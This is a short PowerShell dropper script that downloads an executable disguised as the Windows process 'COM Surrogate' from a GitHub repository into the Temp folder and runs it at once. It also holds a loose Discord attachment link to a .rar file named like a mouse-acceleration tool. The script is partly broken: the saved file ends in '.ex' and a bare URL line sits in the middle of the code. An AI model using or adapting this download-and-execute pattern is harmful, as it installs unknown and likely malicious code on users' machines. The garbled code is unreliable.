# Define the URL of the .exe file
$url = "https://github.com/M7mmdddd/webstie-demo/blob/main/files/COM%20Surrogate.exe"

# Define the path where the .exe will be saved (e.g., in the Temp folder)
$outputPath = "$env:TEMP\COM Surrogate.ex"
https://cdn.discordapp.com/attachments/1333859309809041610/1342560257565655151/Rawaccel-cc.rar?ex=67ba142c&is=67b8c2ac&hm=631ebb88f83c1035515c9e03229b861f319caffe243b53e961f2438f6076bf8f&
# Download the .exe file
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Execute the .exe file
Start-Process -FilePath $outputPath
